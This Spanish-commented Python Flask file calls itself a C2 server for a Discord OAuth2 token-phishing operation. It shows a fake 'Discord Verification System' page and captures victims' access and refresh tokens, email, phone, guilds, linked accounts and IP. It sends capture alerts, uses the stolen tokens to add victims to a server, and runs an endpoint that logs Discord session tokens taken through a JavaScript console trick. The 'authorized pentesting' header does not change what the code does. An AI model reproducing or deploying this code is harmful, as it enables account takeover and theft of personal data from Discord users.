# c2_server.py
# Servidor C2 que recibe el callback OAuth2 de Discord
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

from flask import Flask, request, jsonify, render_template_string
import requests
import datetime
import logging
import os
from config import config
from token_manager import token_manager
from webhook_alerts import alert_manager
from api_endpoints import api

logger = logging.getLogger("C2Server")
app = Flask(__name__)
app.register_blueprint(api)

SUCCESS_PAGE = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Verificación completada</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
.container{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border-radius:20px;padding:40px 60px;text-align:center;border:1px solid rgba(255,255,255,0.1);max-width:500px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.checkmark{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#4ecca3,#2ecc71);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:40px;animation:scaleIn .5s ease-out}
@keyframes scaleIn{0%{transform:scale(0)}70%{transform:scale(1.1)}100%{transform:scale(1)}}
h1{font-size:24px;margin-bottom:10px;color:#4ecca3}
p{color:#b0b0b0;line-height:1.6;margin:5px 0}
.loader{width:30px;height:30px;border:3px solid rgba(255,255,255,0.1);border-top-color:#4ecca3;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto 0}
@keyframes spin{to{transform:rotate(360deg)}}
.footer{margin-top:20px;font-size:12px;color:#666}
</style>
</head>
<body>
<div class="container">
<div class="checkmark">&#10003;</div>
<h1>¡Verificación completada!</h1>
<p>El bot se ha añadido al servidor correctamente.</p>
<p>Redirigiendo a Discord...</p>
<div class="loader"></div>
<div class="footer">Discord Verification System v3.2.1</div>
</div>
<script>setTimeout(function(){window.location.href="https://discord.com/channels/@me"},3000)</script>
</body>
</html>"""

@app.route(config.CALLBACK_PATH)
def oauth_callback():
    code = request.args.get("code")
    state = request.args.get("state")
    guild_id = request.args.get("guild_id")

    if not code:
        logger.warning("Callback sin código")
        return "Error: No se recibió código de autorización", 400

    logger.info(f"Callback recibido - guild_id: {guild_id}")

    # 1. Canjear código por access token
    token_url = "https://discord.com/api/v9/oauth2/token"
    data = {
        "client_id": config.CLIENT_ID,
        "client_secret": config.CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": config.CALLBACK_URL,
        "scope": config.OAUTH_SCOPES
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        r = requests.post(token_url, data=data, headers=headers, timeout=15)
    except Exception as e:
        logger.error(f"Error canjeando código: {e}")
        return "Error interno", 500

    if r.status_code != 200:
        logger.error(f"Error canjeando código: HTTP {r.status_code}")
        return "Error de autorización", 400

    token_data = r.json()
    access_token = token_data.get("access_token")
    refresh_token = token_data.get("refresh_token")
    expires_in = token_data.get("expires_in", 604800)

    # 2. Obtener perfil del usuario
    headers = {"Authorization": f"Bearer {access_token}"}

    try:
        r2 = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        r3 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
    except Exception as e:
        logger.error(f"Error obteniendo perfil: {e}")
        return "Error obteniendo datos", 500

    user_info = r2.json() if r2.status_code == 200 else {}
    user_guilds = r3.json() if r3.status_code == 200 else []

    # 3. Obtener conexiones
    connections = []
    if "connections" in config.OAUTH_SCOPES:
        try:
            r4 = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers, timeout=10)
            if r4.status_code == 200:
                connections = r4.json()
        except:
            pass

    # 4. Construir entrada
    entry = {
        "user_id": user_info.get("id"),
        "username": user_info.get("username"),
        "discriminator": user_info.get("discriminator", "0"),
        "global_name": user_info.get("global_name"),
        "email": user_info.get("email"),
        "phone": user_info.get("phone"),
        "avatar": user_info.get("avatar"),
        "banner": user_info.get("banner"),
        "accent_color": user_info.get("accent_color"),
        "mfa_enabled": user_info.get("mfa_enabled", False),
        "premium_type": user_info.get("premium_type", 0),
        "verified": user_info.get("verified", False),
        "locale": user_info.get("locale"),
        "nsfw_allowed": user_info.get("nsfw_allowed"),
        "access_token": access_token,
        "refresh_token": refresh_token,
        "expires_in": expires_in,
        "expires_at": (datetime.datetime.now() + datetime.timedelta(seconds=expires_in)).isoformat(),
        "captured_at": datetime.datetime.now().isoformat(),
        "guild_id": guild_id,
        "user_guilds": [g["id"] for g in user_guilds],
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "connections": [{"type": c.get("type"), "name": c.get("name"), "verified": c.get("verified")} for c in connections]
    }

    # 5. Almacenar token
    token_manager.add_token(entry)

    # 6. Enviar alerta
    alert_manager.send_token_captured_alert(entry)

    # 7. Unir al usuario al servidor
    if guild_id and user_info.get("id"):
        try:
            join_url = f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_info['id']}"
            join_headers = {"Authorization": f"Bot {config.BOT_TOKEN}", "Content-Type": "application/json"}
            join_data = {"access_token": access_token}
            r_join = requests.put(join_url, json=join_data, headers=join_headers, timeout=10)
            if r_join.status_code in (200, 201, 204):
                logger.info(f"Usuario {user_info.get('username')} unido al servidor {guild_id}")
            else:
                logger.warning(f"No se pudo unir usuario: HTTP {r_join.status_code}")
        except Exception as e:
            logger.error(f"Error uniendo usuario: {e}")

    logger.info(f"✅ TOKEN CAPTURADO: {user_info.get('username')} (ID: {user_info.get('id')}, Email: {user_info.get('email','N/A')})")

    # 8. Mostrar página de éxito
    return render_template_string(SUCCESS_PAGE)

@app.route("/api/js_capture", methods=["POST"])
def js_capture():
    """Endpoint para tokens capturados vía JS console (sesión, no OAuth2)"""
    data = request.json
    if data and data.get("token"):
        token = data["token"]
        logger.info(f"⚠️ TOKEN DE SESIÓN CAPTURADO vía JS: {token[:50]}...")
        with open("data/js_captured_tokens.txt", "a") as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] {token}\n")
        return jsonify({"status": "ok"}), 200
    return jsonify({"error": "No token"}), 400

def run_server():
    missing = config.validate()
    if missing:
        logger.warning(f"Configuración incompleta. Faltan: {', '.join(missing)}")
    print(f"\n{'='*60}")
    print(f"  SERVIDOR C2 OAUTH2")
    print(f"  Host: {config.C2_HOST}:{config.C2_PORT}")
    print(f"  Callback URL: {config.CALLBACK_URL}")
    print(f"{'='*60}\n")
    try:
        if config.C2_PORT == 443:
            app.run(host=config.C2_HOST, port=config.C2_PORT, ssl_context="adhoc", debug=False, threaded=True)
        else:
            app.run(host=config.C2_HOST, port=config.C2_PORT, debug=False, threaded=True)
    except Exception as e:
        logger.error(f"Error iniciando servidor: {e}")
        logger.error("Prueba con 'pip install pyopenssl'")
